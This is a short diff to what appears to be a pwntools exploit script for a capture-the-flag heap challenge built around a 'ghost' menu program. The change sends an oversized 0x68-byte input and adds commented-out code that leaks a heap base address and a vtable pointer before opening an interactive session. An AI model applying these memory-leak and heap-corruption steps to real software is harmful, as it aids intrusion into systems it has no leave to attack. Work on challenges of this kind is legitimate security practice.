@@ -55,7 +55,13 @@ def ghost_remove(index):
 def ghost_exit():
   sl(b'5', b'Your choice :')
 
-ghost_add('a', '12', 'b', Ghost.VAMPIRE, 1, 3)
-ghost_remove(0)
+ghost_add('a', 1, 'a', Ghost.VAMPIRE, b'A'*0x68, 3)
+#heap_base = int.from_bytes(ghost_info(0).split(b' : ')[-1][:-1], 'little')#-0x12dc0
+#log.info("Leaked heap base: %#lx" % heap_base)
+
+#ghost_add('a', 1, 'a', Ghost.WEREWOLF, 0, 1)
+#vtable_leak = int.from_bytes(ghost_info(0).split(b' : ')[-1][:-1], 'little')
+#print(hex(vtable_leak))
+
 p.interactive()
 
